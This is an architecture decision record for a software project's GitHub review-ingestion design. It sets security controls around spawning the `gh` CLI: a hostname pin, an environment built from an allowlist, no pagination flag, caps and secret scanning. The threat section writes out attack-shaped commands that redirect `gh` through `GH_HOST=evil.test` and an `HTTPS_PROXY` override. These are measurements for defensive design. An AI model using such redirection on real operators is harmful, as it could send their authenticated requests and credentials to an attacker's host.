# ADR-0030: Review ingestion spawns `gh`, over public allowlisted repositories only

- Status: proposed
- Date: 2026-09-05
- Deciders: Theurian maintainers
- Requirements: FR-V1, FR-V5, FR-V6, SEC-9, SEC-10, SEC-11, SEC-15, SEC-19, T-3,
  T-7
- Decision recorded in
  [#479](https://github.com/theurian/theurian/issues/479), the Milestone 8
  design-first step for the FR-V GitHub-API arm
- Situates against [ADR-0004](0004-sqlite-is-a-derived-artifact.md) (what makes a
  SQLite file safe to delete), [ADR-0013](0013-ai-writes-produce-proposals.md)
  (nothing ingested here becomes approved knowledge),
  [ADR-0019](0019-front-matter-is-data-not-governance.md) (ingested labels are
  data, not governance), [ADR-0026](0026-evidence-plane-not-control-plane.md) (a
  served review thread is evidence; it gates nothing),
  [ADR-0027](0027-accept-validates-before-it-moves.md) (the pre-landing secret
  scan this one mirrors), and
  [ADR-0029](0029-review-findings-are-governed-knowledge.md) (the git-native
  floor of FR-V, which named this arm as explicitly not its own)

**This ADR records a decision and ships no code.** The adapter, the environment
construction, the caps, the version floor, the evidence files, the scan gate, the
serving store, `review.search`, the capability flag, the T-7 rewrite and the
prose-population sweep are all deferred to the slices named in *Slicing plan* and
*Compliance*. Nothing here modifies `SCHEMA_VERSION`, `INDEX_SCHEMA_VERSION`,
`FINDINGS_SCHEMA_VERSION`, any `*.schema.json`, or any `*.py`; the diff is
confined to `docs/`.

**Two measurement frames, kept apart on purpose.**

1. **The `gh` behaviour measurements** — runs A, B and C in decision 1, the
   GraphQL introspection in decision 5, and the configuration-key observation in
   decision 1 — **were taken during the design consult on 2026-09-05 against
   `gh` 2.86.0, and are quoted here rather than re-run.** This document's own
   change performs no network call at all. They therefore say what was true of
   that binary on that date; slice 1 re-runs them as driving tests, which is
   where they stop being quotations and become a control.
2. **Every repository measurement** was taken on 2026-09-05 against `origin/main`
   @ `1fe3302b`, and each names the command that produced it. Where a
   measurement is a *population*, the key is stated beside the number so a reader
   can attack the key and not only the count.

## Context

[ADR-0029](0029-review-findings-are-governed-knowledge.md) built the git-native
floor of FR-V: `Review-Finding:` trailers parsed out of local history, landed in
their own store, served as `review.findings`. It bounded itself explicitly — "the
GitHub-API arm (threads, inline comments, resolution state, CI results, LLM
candidate generation) is broader, needs credentials, and is not this ADR's to
design". This ADR is that arm's design.

**What exists today, measured.** The domain model is built and nothing fills it:

| Fact | Command (2026-09-05, `origin/main` @ `1fe3302b`) | Result |
| :-- | :-- | :-- |
| The `ReviewProvider` GitHub adapter | `cat packages/theurian-core/src/theurian/infrastructure/github/__init__.py` | a package docstring that says "**Not implemented.** This package holds no adapter and no HTTP client" |
| The capability the server publishes | `grep -n 'reviewIngestion' packages/theurian-core/src/theurian/mcp/tools.py` | `"reviewIngestion": False` (line 1905) |
| The allowlist key | `git grep -n 'providers.review.repositories' -- packages/theurian-core/src` | one hit, in `security/project_config.py`'s own prose; no reader |
| The tool names already published as planned | the planned-tools table in `docs/protocol/mcp-tools.md`, lines 352–358 (command and output in *Compliance*) | **7** rows — `review.findings` shipped, six planned, `review.search` among them |
| Places in the shipped package that can start another program | the pinned set in `tests/unit/test_network_call_sites.py` (`PROCESS_SPAWN_SITES`) | **3**: `cli/context.py`, `infrastructure/git/trailer_source.py`, `infrastructure/services/runner.py` — none of them reaches a network |

**T-7 has had the wrong owner twice, and this is the change that ends that.**
`docs/security/threat-model.md` records three controls for SSRF — a scheme
allowlist, private-network rejection, and the repository allowlist in
`.theurian/config.yaml` — and none of the three is built.
[#129](https://github.com/theurian/theurian/issues/129) was closed having
corrected the entry's *wording*; the audit then repointed the controls at
[#368](https://github.com/theurian/theurian/issues/368), and review found that
#368 builds no fetch path either. The threat model states the lesson in its own
words: **"an owner has to be the change that would implement the control, and an
epic in the right milestone is not automatically that."**
[#429](https://github.com/theurian/theurian/issues/429) now holds the three
against whatever first performs an external fetch. This ADR's slice 1 *is* that
change, for one of the three.

**What stands in for the controls today is an absence, and the first spawn site
deletes it.** `tests/unit/test_network_call_sites.py` pins, by equality against
the whole set, that nothing in the shipped package outside three fixed-argument
spawn sites and the daemon's own loopback health probe can open a connection.
Its process-spawn arm was added precisely because a `gh api` adapter "would
contain no client module at all" — a mutation that replaced a fetch with
`subprocess.run(["curl", ...])` survived the entire suite with the network
enumeration green. That file states the admission checklist this ADR has to
satisfy, and it is quoted here verbatim rather than paraphrased
(`test_network_call_sites.py:653-661`):

> If you added a site, establish before listing it: the argument vector is fixed
> by the adapter rather than taken from a document or a configuration file; the
> command cannot be handed a URL or a remote; there is a timeout; and a test goes
> red when any of those stops holding. If the command *is* meant to reach the
> network — the Milestone 7 `gh api` shape — then the repository allowlist is due
> in the same change, along with the documents that currently promise nothing
> fetches: docs/security/threat-model.md (T-7) and the infrastructure/github/
> package docstring.

So the design problem is not "how do we call GitHub". It is: **the moment a spawn
site is admitted, an absence that many documents rest on stops being true, and
something has to hold what the absence was holding.** Decision 1 is the
replacement, stated in the positive.

## Decision

### 1. GitHub is reached by spawning `gh api graphql`, and the absence control is replaced by a positive invariant

The adapter reaches GitHub by spawning the operator's `gh` binary as an argument
vector. The absence control retires at the commit that adds the site, and the
nine clauses below take its place. **Each clause is a property, and each owes a
test that goes RED when it stops holding** — an invariant with no test is what
the absence was already better than.

| # | The rule | What it prevents | Owed test, and its slice |
| :-- | :-- | :-- | :-- |
| 1 | **Exactly one module may reach GitHub.** The spawn site lives in `infrastructure/github/`, and the pinned spawn-site set grows by exactly that one entry. | A second fetch path added later on a page nobody re-reads; the equality pin catches an addition *and* a removal. | The existing `PROCESS_SPAWN_SITES` equality assertion, extended by one entry, plus a test that no other module in the shipped package names the adapter's spawn helper. Slice 1. |
| 2 | **The endpoint is the literal `graphql`.** Repository identity travels as typed GraphQL variables, never in the URL position. | The `gh api <path>` form interpolates caller data into a path; the GraphQL form has no path segment an owner or repo name can escape into. It also means no raw URL exists for T-7's scheme allowlist to be needed on. | A test that the argument vector's endpoint element equals `graphql` byte-for-byte, and that no element is derived by string-formatting a repository name. Slice 1. |
| 3 | **The destination host is pinned by an explicit `--hostname github.com`.** | An inherited `GH_HOST` silently moving the request to another host — measured to move it (run B). | A test asserting the flag and its value are present in every spawned vector. Slice 1. |
| 4 | **The child environment is CONSTRUCTED from an explicit allowlist** (`env={...}` passed to the spawn), never inherited and never merely scrubbed. | The measured attack class below: *destination and identity taken from inherited environment*. A scrub is a blocklist, and a blocklist has to be right about every variable `gh` and its transport stack read; a constructed environment has to be right about the few Theurian deliberately passes. | A test that the spawn is called with an explicit `env` mapping whose keys equal a named constant, and a negative test that a destination-bearing variable set in the parent does not appear in the child. Slice 1. |
| 5 | **The `gh` binary is resolved to an absolute path, and the vector is passed with `shell=False`.** | SEC-9 verbatim: "Never build a shell command by string concatenation. `git` and `gh` are invoked as argument vectors with `shell=False`" (`requirements-analysis.md:236`). An unresolved name is also a `PATH` question, and clause 4 removes `PATH` from the question by constructing the environment. | A test that the first vector element is an absolute path and that `shell=True` appears nowhere in the module. Slice 1. |
| 6 | **No `--paginate`.** Pagination is GraphQL cursors only. | `--paginate` follows a `Link`/cursor URL that the *response* supplies — a server-controlled destination, which is the SSRF shape T-7 names, arriving through a flag rather than through a document. With cursors, the only thing that crosses is an opaque string in a typed variable, and the vector still names `graphql`. | A test that `--paginate` is absent from every spawned vector, and a cursor-pagination test over a recorded fixture. Slice 1. |
| 7 | **A request timeout (SEC-19) and recorded ingest cost bounds: a page cap and a PR-count cap, each a named constant.** Exceeding a cap is a reported, graded stop, never a silent truncation and never an unbounded loop. | A caller — or a large repository — making the system spend work no recorded limit bounds. The severity table grades exactly that as HIGH, and [#26](https://github.com/theurian/theurian/issues/26)'s T-6 concurrency cap is the precedent for how such a bound is recorded: a constant, a test, and prose that names the number. | A test per cap that the constant is the value the adapter uses, and a test that a fixture exceeding the cap stops with a report. Slice 1. |
| 8 | **A `gh` version floor, expressed as a constant with a test, not as prose.** | `gh` is not a Python dependency, so [ADR-0014](0014-dependency-pinning-and-pre-1-0-isolation.md)'s exact pinning does not reach it; the behaviours clauses 2–6 rely on are flag and config behaviours of a binary the operator upgrades independently. Prose asking for "a recent gh" is not a control. | A test that the adapter refuses to spawn below the floor, and that the floor is the constant the refusal message names. Slice 1. Measured against 2.86.0 — the floor is chosen at implementation, not asserted here. |
| 9 | **`gh` absent, or present and unauthenticated, is a graded refusal envelope with a remedy — never a traceback.** | The failure the product already has a shape for: `requirements-analysis.md:328-329` records `Degraded` as "a success-with-warnings terminal state, not a failure: a missing `gh` token must not prevent local knowledge from working." Ingestion is the optional capability; the rest of the product keeps working. | A test for each of the two states asserting a refusal envelope carrying a remedy, and that no traceback reaches the caller. Slice 1. |

#### The attack class clause 4 exists for, measured

Three runs, quoted from the design consult of **2026-09-05, `gh` 2.86.0**. Runs B
and C are the positive controls: without them, a clean run of A would be
consistent with the threat not existing at all.

| Run | Command shape | Observed |
| :-- | :-- | :-- |
| **A** | `GH_HOST=evil.test gh api --hostname github.com graphql …` | request went to `Host: api.github.com` — **the `--hostname` pin holds against `GH_HOST`** |
| **B** | `GH_HOST=evil.test gh api graphql …` (no pin) | error connecting to `evil.test` — **the threat is real**, and A's result is a pin doing work rather than a variable being ignored |
| **C** | `HTTPS_PROXY=http://127.0.0.1:9 gh api --hostname github.com graphql …` | `proxyconnect tcp: dial tcp 127.0.0.1:9` — **the pin does not cover this class**: the request was routed to loopback with the hostname pin in place |

Run C is the reason clause 4 is *construction* and not *scrubbing of `GH_HOST`*.
The destination is decided by more than one variable, the proxy family is a
second one, and a defence that enumerates the variables an attacker may not set
is a defence that must be complete. Constructing the environment inverts that: it
must be complete about what Theurian deliberately passes, which is a set this
project chooses and pins.

#### Two recorded decisions that come with this transport, stated as decisions

**Theurian borrows the operator's ambient GitHub identity, and holds no token.**
The allowlisted environment carries the credential-source variables `gh` needs to
find the operator's existing authentication (the `HOME` / `GH_CONFIG_DIR`
family). The consequence is stated plainly rather than filed as a footnote:
ingestion runs with **whatever scopes the operator's `gh` login already has**,
which may include private repositories. That is accepted, because the alternative
is Theurian taking custody of a token (rejected in *Alternatives considered*),
and because the control that keeps ingestion off private repositories is decision
2's allowlist and its refusal — not the credential's reach. Slice 1 fixes the
exact allowlist membership and pins it; the rule this ADR fixes is the split: a
variable that can supply *credentials* may be passed, a variable that can move the
*destination* may not.

**`gh`'s own persisted configuration stays in the operator's trust domain.** A
`gh` configuration file can change transport behaviour — measured on 2.86.0,
`http_unix_socket` is a real configuration key (while `api_host` is not, which is
why the decision names the *class* and not one key). Theurian does not read,
validate, or override that file. The reason is a containment argument, not an
oversight: an actor who can write the operator's `gh` config can also replace the
`gh` binary that the adapter spawns, so a check there buys nothing a
determined-local-attacker model does not already concede. It is recorded as an
accepted residual so that a later reader does not mistake silence for coverage.

### 2. Scope: public allowlisted repositories only, and the argument is an audience argument

The adapter reads `providers.review.repositories` **before any spawn**. The key
is already schema-ready: `schemas/config/project-config.schema.json` types it as
an array of strings matching `^[\w.-]+/[\w.-]+$`, beside a
`providers.review.adapter` enum of `github | none` defaulting to `none`. Its
description says "Not in force… Nothing reads it today", and slice 1 is the change
that makes both sentences false and rewrites them.

Two refusals, both with synthetic-input driving tests owed to slice 1:

1. **A repository not in the allowlist is refused before the process is
   spawned.** Not filtered after the fetch — the spawn does not happen.
2. **A repository that resolves as private is refused at ingestion**, even if it
   is in the allowlist, and nothing about it is written.

**The argument for public-only v1 is an audience argument, and it must be written
narrowly.** The tempting sentence — "a public repository cannot carry embargoed
content" — is false as a universal, and this ADR does not make it: a public
repository's review threads can discuss anything, including an unpublished
vulnerability, and this project's own embargo discipline exists precisely because
people are capable of putting such a thing where it does not belong. The true and
narrower claim is:

> Public-only v1 ingests **no advisory-private GitHub surface** (private
> repositories, security advisories, private forks), and it serves only material
> that is **already visible to the public repository's audience**.

That is the same structural shape ADR-0029 decision 6 records for public `main`:
the protection is *structural* — the source has no access to the withheld
surface — and it is not a claim that the public surface is guaranteed clean. What
guards the second half is unchanged from the rest of the product: the secret scan
at ingestion (decision 4) and the untrusted-content triple at serve (decision 6).

**The private-repository arm stays owed, and is named.** ADR-0029 assigned it to
this arm: a finding marked `securityRelated` at ingestion time, where advisory
state is available, then refused **uniformly** at serve — the refusal must not
distinguish "an embargoed item exists and is withheld" from "no such item
exists". Milestone 8 does not build it, and this ADR does not silently drop it: it
is future work for the follow-up that adds private-repository ingestion, and it
is listed again in *What this does not close* so a reader who skips this section
still meets it.

**The scope is machine-visible, not only prose.** `system.capabilities` today
publishes `reviewIngestion: false` beside `reviewFindings: true`, and
`docs/roadmap.md` records why those two are separate flags: "the change that
reaches GitHub is the one that owes SEC-10's repository allowlist … and an
offline trailer read owes none." The same reasoning applies one level down, so
the flag alone is not enough: a client that reads `reviewIngestion: true` and
nothing else would conclude that review history is ingested wherever the operator
points it. The decision is therefore **`reviewIngestion: true` plus a scope
field** — proposed shape `reviewIngestionScope: "public-allowlisted"`, a string
beside the booleans — flipped together at the serve slice, with the wire schema
change that publishes them landing in slice 3.

### 3. Evidence files are the source; SQLite is derived

Normalized evidence records land as **structured JSON files under
`.theurian/review/`** — durable, git-trackable, and deliberately **not** under
`.theurian/cache/`. The SQLite serving store (slice 3) is built from those files
and is deletable.

**This settles a contradiction that is live in the documentation today.**
`docs/architecture/review-knowledge.md` (Privacy) says "The review cache is a
derived artifact under `.theurian/cache/`, git-ignored and rebuildable." That
sentence is safe for an artifact whose source outlives it. It is not safe here:
**GitHub review comments are editable and deletable upstream**, so a deleted local
copy of a comment that has since been deleted upstream is **data loss, not a cache
miss**, and no refetch recovers it. "Rebuildable" would be asserting a property
the upstream does not provide.

With files as the source, [ADR-0004](0004-sqlite-is-a-derived-artifact.md)'s real
property comes back: **deleting the SQLite store is a cache miss, because the
store is rebuilt from the evidence files.** The contrast with the findings store
is worth stating honestly, because the two look alike and are grounded
differently — `infrastructure/sqlite/findings_schema.py` says so in its own
docstring: the findings store is safe to delete because "the source of truth is
**git history** … and this file is reconstructed wholesale by replaying the git
source." Review evidence has no such replayable source. So:

| Artifact | Why deleting it is safe | Layer ([ADR-0010](0010-three-layer-knowledge-model.md)) |
| :-- | :-- | :-- |
| Review-finding store (ADR-0029) | git history is replayable | Canonical, projected from git |
| **Review evidence files (this ADR)** | **nothing — they are the source** | **Source** |
| Review serving store (slice 3) | rebuilt from the evidence files | Index / derived |

**Refetch is a best-effort refresh, never the durability story.** A later
ingestion run updates what upstream still returns and does not delete what it no
longer does; a record that vanished upstream stays in the evidence files, marked
with the run that last saw it. Whether a project commits `.theurian/review/` is
the project's decision — the directory is not written into the ignore block, and
redaction at ingestion (review-knowledge.md, Privacy) governs what lands in it.

### 4. The secret scan runs at ingestion, per record, like `propose accept`

`security.secretScan` (SEC-11) applies **at ingestion, per record, before a
record becomes a file**:

| Policy | Behaviour at review ingestion |
| :-- | :-- |
| `block` (default) | the flagged record is **refused and never written**; the run reports the refusal by record identity and does not exit as if it were clean |
| `warn` | the record lands and every finding is reported |
| `off` | no scan |

**This mirrors `propose accept`, not `index build`, and the reason is the source's
own premise.** `application/index_secret_scan.py` states why the *build* records
rather than refuses:

> A landed secret is readable through `knowledge.search` and `knowledge.get` the
> moment `theurian migrate apply` writes it, before any index exists at all …
> So a build that refused to publish would deny *ranking* without un-disclosing
> anything.

That premise is false pre-landing. Review ingestion runs **before** the content
exists anywhere in Theurian, so refusing genuinely un-discloses: nothing is
written, nothing is served, and the operator still has the upstream comment where
it always was. The gate that matches is ADR-0027's — validate before you move.

The report names the *record* (repository, PR number, thread and comment id), not
the matched bytes, for the reason `index_secret_scan.py` gives about pasted
reports: a report that quotes the secret is a second copy of it.

**The consult disagreed here, and the disagreement is recorded rather than
smoothed over.** The Codex reader recommended the `index build` signal-mode shape
(land and report, never refuse), reasoning by analogy with the existing
scan-at-build control. The watchdog reader checked the *premise* of that control
rather than its shape and found it did not transfer — the "already disclosed"
condition is exactly what ingestion does not have. The premise check won, and the
analogy lost. It is noted here so a future reader who rediscovers the analogy
finds the answer instead of re-deciding it.

### 5. The domain model bends to what GitHub can answer

The `ReviewResolution` model as built requires two fields GitHub does not
guarantee. Three changes, all slice 1 work:

| Field | Today | Becomes | Why |
| :-- | :-- | :-- | :-- |
| `resolved_at` | `datetime` (required) | `datetime \| None` | **No resolution timestamp exists on the API object.** |
| `resolved_by` | `ReviewParticipant` (required) | `ReviewParticipant \| None` | `resolvedBy` is nullable — a thread can be resolved with no participant recorded. |
| `ci_successful` | `bool \| None` | unchanged | `None` already means *unknown*, and that is the honest value for a PR with no status rollup. |

**The measurement, quoted from the design consult (2026-09-05, GraphQL schema
introspection).** `PullRequestReviewThread`'s fields are:

```text
comments  diffSide  id  isCollapsed  isOutdated  isResolved  line
originalLine  originalStartLine  path  pullRequest  repository  resolvedBy
startDiffSide  startLine  subjectType  viewerCanReply  viewerCanResolve
viewerCanUnresolve
```

There is no resolution-timestamp field in that list, and `resolvedBy` is
nullable. A required field the provider cannot fill has exactly one
implementation: the adapter fabricates a value — the ingestion time, or the last
comment's time — and every consumer downstream reads a real timestamp that
nobody measured. Making the field optional is the change that keeps *unknown*
expressible.

**This is a breaking change to the domain model, and it costs nothing today.**
Measured 2026-09-05 against `origin/main` @ `1fe3302b`, with the population key
being *every occurrence of the symbol anywhere in the shipped package*:

```console
$ git grep -n "ReviewResolution" -- packages/theurian-core/src
packages/theurian-core/src/theurian/domain/review.py:98:class ReviewResolution:
packages/theurian-core/src/theurian/domain/review.py:121:    resolution: ReviewResolution | None = None
```

Two hits, both inside the defining module — the class statement and its own field
on `ReviewThread`. There is no consumer to migrate. The CHANGELOG entry for slice
1 still names it as a breaking change with the old shape and the new one, because
"no consumer exists" answers the migration cost and not the question of whether
the record is honest.

**`ci_successful`'s mapping is a rule, not a measured enum.** The adapter maps the
PR's status rollup to the tri-state as: a definite success → `True`; a definite
failure or error → `False`; **anything else — pending, expected, absent, or a
value this version of the adapter does not recognise — → `None`.** The mapping is
stated by semantics rather than by enumerating the API's enum members, because
this ADR did not measure that enum; slice 1 pins the member list against the
schema at implementation time. The load-bearing half is the default: an
unrecognised value becomes *unknown*, never *failed*, so a promotion gate never
reads a shrug as a verdict.

**Candidate generation is out of Milestone 8.** FR-V2 classification and FR-V3
`KnowledgeCandidate` generation are the write-path half of Phase B: they are
SEC-12-gated, and they raise the model question ([ADR-0009](0009-no-llm-vendor-lock-in.md))
that ingestion does not. They are filed and sequenced, not folded in. **FR-V5 is
satisfied structurally rather than by a fallback path: no model exists anywhere in
the ingest path**, so raw ingestion cannot be broken by candidate generation
failing.

### 6. Serving is `review.search`, under the SEC-15 triple, with its own disclosure round

The serving surface is **`review.search`**, taken from the already-published
planned table in `docs/protocol/mcp-tools.md` (7 `review.*` rows, measured above).
No eighth name is invented: a tool name is a wire contract, and the table has
been publishing this one as planned.

**Every body-derived field is untrusted content (T-3, SEC-15); only structural
fields are validated and normalized.**

| Served field | Origin | Trust |
| :-- | :-- | :-- |
| comment body, PR or thread title, participant display name, file path *as received* | authored by whoever opened the PR or wrote the comment | **untrusted** — carries `contentClassification: untrusted-knowledge`, `mayContainInstructions: true`, `executable: false` |
| thread state, resolution state, timestamps, line numbers, repository, PR number, provider ids | generated by the provider | validated and normalized |

The file path is deliberately on the untrusted side: it is chosen by whoever
authored the pull request. It is served as data and **SHALL NOT** be used to build
a filesystem path — the containment SEC-7 requires is not weakened by a string
that arrived over the network.

**The disclosure closure is its own round, and its test is built with the serving
change.** ADR-0029 records that a second surface does not inherit the first's
disclosure round. The closure form this project uses is one query against two
corpora: an index that **held** withheld rows and an index that **never did** must
return identical responses. Because public-only v1 makes real withheld rows
absent, **the fixture is synthetic** — that is not a weaker test, it is the only
way to have a withheld row at all in a corpus whose scope excludes them, and a
sweep with no withheld row reports its own answer.

Two inherited controls are named so the serve slice does not rediscover them:

- If review evidence is ever served through a **ranked** surface, the withheld-row
  exclusion is a **physical purge** (threat-model T-17a), not a result-set filter:
  a `fusedScore` is priced over FTS5/BM25 collection statistics computed at
  index-build time, which a filter does not clean and a tombstone does not move.
  This is ADR-0029's family-4 third instance, and it applies here unchanged.
- `reviewIngestion: true` (with its scope field, decision 2) flips **at the serve
  slice**, not at ingest — the flag says what a client may call.

## Consequences

### Positive

- **T-7's repository allowlist stops being owed and starts running.** Three
  successive documents have promised this control; slice 1 is the first change
  that can carry it, and the threat-model entry is rewritten per control rather
  than repointed at another epic.
- **No new production dependency and no token custody.** The core's runtime
  dependencies are six (`jsonschema`, `pydantic`, `python-ulid`, `pyyaml`,
  `referencing`, `typer` — `packages/theurian-core/pyproject.toml`, measured
  2026-09-05). Spawning `gh` keeps that number, and keeps GitHub credentials in
  the operator's own credential store.
- **The absence control is replaced by something strictly more informative.**
  "Nothing can reach out" is a true sentence that stops being true forever the
  first time it is false. Nine clauses with nine tests keep saying something after
  the first fetch path exists.
- **Evidence outlives the upstream.** Files-as-source means a deleted upstream
  comment is still in the record, which is the whole point of ingesting review
  history rather than querying it live.
- **The scope is machine-readable.** A client learns "public allowlisted
  repositories only" from `system.capabilities`, not from a paragraph.

### Negative

- **A spawn site is a hole no name-based scan can fully watch.**
  `test_network_call_sites.py` records this itself: a program started under a name
  assembled at runtime survives every structural arm, and a socket watch cannot
  see into another process. After slice 1, "what does `gh` do with the vector we
  hand it" is outside every instrument this suite has.
- **Ingestion inherits the operator's identity and scopes.** The credential that
  runs is not one Theurian issued, bounded, or can revoke.
- **`gh` is an unpinned external binary.** ADR-0014's exact pinning does not reach
  it; a version floor with a test is a weaker instrument than a lockfile, and the
  behaviours clauses 2–6 rely on are that binary's.
- **The evidence files are a new durability obligation.** They are the source, so
  losing them is data loss — which is exactly the property that makes them the
  right place for the data, and exactly the property that means a project must
  treat the directory as content rather than as scratch.
- **A second serving surface means a second disclosure round.** `review.search`
  inherits nothing from `review.findings`' round, and its two-corpora fixture has
  to be built rather than borrowed.

### Neutral

- The **git-native arm (ADR-0029) is untouched.** `review.findings` keeps serving
  trailers from local history and keeps needing no allowlist; the two arms share
  the safety triple and the FR-V family, not a source.
- **`.theurian/review/` is not automatically committed.** The ADR decides only
  that it is not a cache; whether a given project tracks it is that project's
  decision.
- The **six planned `review.*` tools other than `review.search`** stay planned.
  This ADR neither builds nor retires them.

## What this does not close

1. **Private-repository ingestion**, and with it the `securityRelated`
   ingestion-time marking plus uniform serve refusal that ADR-0029 assigned to
   this arm. It is future work for the follow-up that adds private repositories,
   and it is not built in Milestone 8.
2. **FR-V2 classification and FR-V3 `KnowledgeCandidate` generation.** The
   write-path half of Phase B, SEC-12-gated, deliberately sequenced after
   ingestion.
3. **The other two T-7 controls in their raw-URL form** — the scheme allowlist and
   private-network rejection — stay [#429](https://github.com/theurian/theurian/issues/429)'s
   (see *Dispositions*).
4. **The remaining planned `review.*` tools**: `review.getThread`,
   `review.findSimilar`, `review.getDecisions`,
   `review.generateKnowledgeCandidate`, `review.listUnresolved`.
5. **GitLab and other providers.** The `ReviewProvider` port exists so that a
   second provider is an adapter and not a domain change; this ADR designs one
   adapter and does not claim the port is provider-neutral until a second one
   exists to test that claim.
6. **FR-V6 Markdown views over review evidence.** The requirement scopes them as
   derived artifacts; this ADR neither designs nor forbids them.
7. **What `gh` does after the vector is handed over.** Clause 8's version floor
   bounds *which* binary, not its behaviour; the residual is recorded in decision
   1 and in *Consequences → Negative*.

## Dispositions this ADR records

Each disposition is a decision with a reason, recorded here so a later session
finds an answer rather than an open question.

**#429 is narrowed, not closed.** Slice 1 discharges **one** of T-7's three
controls — the repository allowlist — for **one** activation context. The scheme
allowlist and private-network rejection stay #429's in their raw-URL form,
because #429's activation context is wider than this ADR: it includes the OpenAPI
`$ref` fetcher, where a URL from an ingested document is the input. T-7 is
therefore rewritten **per control** in slice 1: the absence control retired at a
named commit, the allowlist recorded as discharged with the test that pins it,
and the other two still owed with #429 named. The threat model's own lesson is
the reason this is spelled out — "an owner has to be the change that would
implement the control" — and this entry has had the wrong owner twice.

**The fetch-absence prose population moves in slice 1, in the same PR as the first
spawn site.** Not a later slice, and not a follow-up: on-main claims must never
call the fetch absent while a fetch path ships. Measured 2026-09-05 against
`origin/main` @ `1fe3302b`, with the key stated so it can be attacked:

```console
$ git grep -l -i -E "reviewIngestion|nothing (here )?can reach out|no external fetch|contacts no repository|never fetche[sd]|first external fetch" -- . ':!.claude' | wc -l
      30
```

The key is a deliberately wide phrase heuristic over six spellings, and it
returns tests, tools and work logs alongside the prose that has to change — the
same discipline `tools/audit/owner_position_cites.py` uses: narrow the population
to what a person must read, then have the person read it. The number is a
*dispatch input*, re-measured when slice 1 is briefed, not a claim about how many
sentences are wrong. This sequencing is binding.

**The #368 / #479 boundary, stated so a third owner-position defect cannot
happen.** [#368](https://github.com/theurian/theurian/issues/368) (open, phase-b)
keeps the six git-native findings-store items ADR-0029's owed table assigns it —
including *a ranked-search surface over findings*.
[#479](https://github.com/theurian/theurian/issues/479) (Milestone 8) owns the
GitHub-API arm: events, threads, comments, resolutions. `review.search` serves
**review evidence**, not findings; `review.findings` keeps serving findings. Two
issues, two sources, two tools, no overlap.

**Milestone 8 is a planned epic, so the class-expansion brake does not bind it.**
Four top-row PRs at full synchronous review weight — this ADR, ingest, land,
serve — is the *plan*, not a class that kept producing siblings. A later session
counting PRs in this milestone should read them against the plan, not against the
three-siblings budget.

**Corpus membership: ADR-0030 does not seed a dogfood twin in this PR.** Measured
2026-09-05, no existing committed corpus item's `sourceAnchors[].filePath` names a
review-ingestion or T-7 document, so nothing drifts and no re-seed is owed;
`tools/corpus_drift.py` walks the committed migrations and compares each anchor to
its source, so a new `docs/` file with no twin is outside its population by
construction. Stated because every repo-wide claim in this repository declares
which side of the frozen corpus it stands on.

**The serve slice's real-run verification data source is decided now, not at slice
3.** Verification runs against a **named disposable public fixture repository
under the theurian org** — for example `review-ingestion-fixture` — carrying a
planted, frozen PR and thread set; it is created when slice 3's verification needs
it, allowlisted **only in the verification configuration**, and never in a shipped
default. The ground for deciding it now is the dogfood measurement below: this
repository cannot exercise thread ingestion at all, so "run it for real" has no
data source unless one is made. The rejected alternative is recorded: an external
third-party public repository, rejected because its content can change or vanish
under the assertions, and ground truth a harness asserts against has to be under
this project's control.

**Dogfood honesty: this repository is not a review-ingestion corpus.** Measured
2026-09-05 by the design consult (`gh api graphql` over
`pullRequests(last: 40, states: MERGED)` on theurian/theurian), the last 40 merged
pull requests carry **0 inline review threads and 0 top-level reviews** — this
project's review rounds happen in agent transcripts and land as commit trailers,
which is exactly why ADR-0029's arm exists. Dogfooding this capability on this
repository therefore yields `ReviewEvent` records and nothing below them. The
capability's content value is for repositories that review on GitHub natively.
Recorded so that no completion claim for Milestone 8 overstates what was
exercised.

### Slicing plan

| Slice | Contents | Notable ordering |
| :-- | :-- | :-- |
| **1 — ingest** | the allowlist reader **as its own commit**; then domain fidelity (decision 5); then the adapter, the nine clause tests, and the document corrections | The allowlist reader is a separate commit because it flips a *different measured set* from the adapter: it reddens `tests/unit/test_config_key_call_sites.py`'s pinned absence and moves the prose that says nothing reads the key — 15 files name `providers.review.repositories` (`git grep -l 'providers\.review\.repositories' -- . ':!.claude' \| wc -l`, 2026-09-05, `origin/main` @ `1fe3302b`; key = the literal dotted key), which is not the same population as the fetch-absence set above |
| **2 — land** | evidence files under `.theurian/review/`, the ingestion-time secret-scan gate, the CLI entry point | The CLI verb is slice 2's to choose; naming one here would assert a command that does not exist |
| **3 — serve** | the SQLite serving store, `review.search`, its wire schema, the capability flag and scope field, and the T-7 / roadmap / `mcp-tools.md` updates that follow from serving | The disclosure round and the two-corpora fixture belong to this slice |

## Alternatives considered

| Alternative | Why rejected |
| :-- | :-- |
| **An in-process HTTP client (`httpx` plus a token from the environment)** | Three costs at once. It adds a production dependency to a core whose runtime dependency list is six packages, none of them an HTTP client. It puts **token custody** inside Theurian — reading, holding and possibly logging a credential the operator currently keeps in their own credential store. And it creates a **raw-URL surface**, which makes all three of SEC-10's controls live checks that must be built and kept correct, where the `gh api graphql` form has no URL for a scheme allowlist or a private-network check to be applied to. The `gh` spawn trades a process boundary for all three. |
| **Inherit the parent environment and scrub the dangerous variables** | A scrub is a blocklist over a set the adapter does not control. Run C measured that `HTTPS_PROXY` moves the request even with `--hostname` pinned, so the blocklist would have to be complete over destination variables, proxy variables, and whatever the next `gh` release reads. Constructing the environment inverts the burden onto a set this project chooses and pins. |
| **`gh api --paginate`** | Pagination by `--paginate` follows a destination the *response* supplies. That is precisely T-7's shape arriving through a flag instead of through a document, and it would reintroduce the raw-URL surface the `graphql` endpoint removes. GraphQL cursors carry an opaque string in a typed variable and leave the vector unchanged. |
| **`gh api repos/{owner}/{repo}/pulls/...` (the REST path form)** | Repository identity would travel in the URL position, where it is string-interpolated into a path. The GraphQL form carries the same identity as typed variables with no path to escape into, which is what makes clause 2 a checkable property rather than a promise about quoting. |
| **Keep the review data under `.theurian/cache/` as the existing document says** | Upstream review comments are editable and deletable, so a discarded cache entry for a deleted comment is unrecoverable. Calling that a cache asserts a rebuild property GitHub does not provide. |
| **Scan for secrets at index-build time only, in `index build`'s signal mode (land and report, never refuse)** | This was the Codex reader's recommendation, and it was rejected on the source's own premise: `index_secret_scan.py` records rather than refuses because its content is *already in the canonical store and already served*, so refusal "would deny ranking without un-disclosing anything". Pre-landing, refusal genuinely un-discloses — nothing has been written and nothing served — so the `propose accept` gate is the matching one. |
| **Make `resolved_at` required and fill it with the ingestion time or the last comment's time** | The API object carries no resolution timestamp (decision 5's introspection). A required field filled by the adapter is a fabricated measurement that every downstream consumer reads as real. `None` is the honest value for a quantity the provider does not record. |
